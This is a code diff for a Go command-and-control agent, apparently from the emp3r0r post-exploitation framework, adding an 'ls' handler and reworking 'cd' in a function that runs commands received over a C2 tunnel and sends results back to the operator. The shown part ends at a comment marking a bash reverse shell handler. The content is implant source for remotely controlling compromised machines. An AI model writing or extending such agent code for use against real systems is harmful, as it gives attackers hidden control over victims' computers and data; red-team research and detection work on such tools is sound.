@@ -9,6 +9,8 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // exec cmd, receive data, etc
@@ -37,17 +39,36 @@ func processCCData(data *MsgTunData) {
 			goto send
 		}
 
+		// ls current path
+		if cmdSlice[0] == "ls" {
+			if len(cmdSlice) != 1 {
+				return
+			}
+			cwd, err := os.Getwd()
+			if err != nil {
+				log.Printf("cwd: %v", err)
+				goto send
+			}
+			out, err = util.LsPath(cwd)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			if err != nil {
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, err.Error())
+			}
+			goto send
+		}
+
 		// change directory
 		if cmdSlice[0] == "cd" {
+			out = "cd failed"
 			if len(cmdSlice) != 2 {
 				return
 			}
 
 			if os.Chdir(cmdSlice[1]) == nil {
 				out = "changed directory to " + cmdSlice[1]
-				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
-				goto send
 			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
 		}
 
 		// bash reverse shell
